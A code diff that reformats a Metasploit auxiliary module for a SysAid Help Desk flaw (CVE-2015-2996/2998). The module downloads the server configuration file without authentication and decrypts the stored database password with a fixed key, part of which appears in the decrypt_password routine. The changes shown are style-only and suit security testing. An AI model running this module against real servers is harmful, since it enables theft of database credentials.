@@ -9,38 +9,40 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'SysAid Help Desk Database Credentials Disclosure',
-      'Description' => %q{
-        This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated
-        user to download arbitrary files from the system. This is used to download the server
-        configuration file that contains the database username and password, which is encrypted
-        with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux.
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SysAid Help Desk Database Credentials Disclosure',
+        'Description' => %q{
+          This module exploits a vulnerability in SysAid Help Desk that allows an unauthenticated
+          user to download arbitrary files from the system. This is used to download the server
+          configuration file that contains the database username and password, which is encrypted
+          with a fixed, known key. This module has been tested with SysAid 14.4 on Windows and Linux.
         },
-      'Author' =>
-        [
+        'Author' => [
           'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
         ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           ['CVE', '2015-2996'],
           ['CVE', '2015-2998'],
           ['URL', 'https://seclists.org/fulldisclosure/2015/Jun/8'],
           ['URL', 'https://github.com/pedrib/PoC/blob/master/advisories/sysaid-14.4-multiple-vulns.txt']
         ],
-      'DisclosureDate' => '2015-06-03'))
+        'DisclosureDate' => '2015-06-03'
+      )
+    )
 
     register_options(
       [
         OptPort.new('RPORT', [true, 'The target port', 8080]),
         OptString.new('TARGETURI', [ true, 'SysAid path', '/sysaid']),
-      ])
+      ]
+    )
   end
 
-
-  def decrypt_password (ciphertext)
+  def decrypt_password(ciphertext)
     salt = [-87, -101, -56, 50, 86, 53, -29, 3].pack('c*')
     cipher = OpenSSL::Cipher.new("DES")
     base_64_code = Rex::Text.decode_base64(ciphertext)
@@ -125,7 +127,7 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def report_credential_core(cred_opts={})
+  def report_credential_core(cred_opts = {})
     # use a basic core only since this credential is not known valid for service it was obtained from.
     credential_data = {
       origin_type: :service,
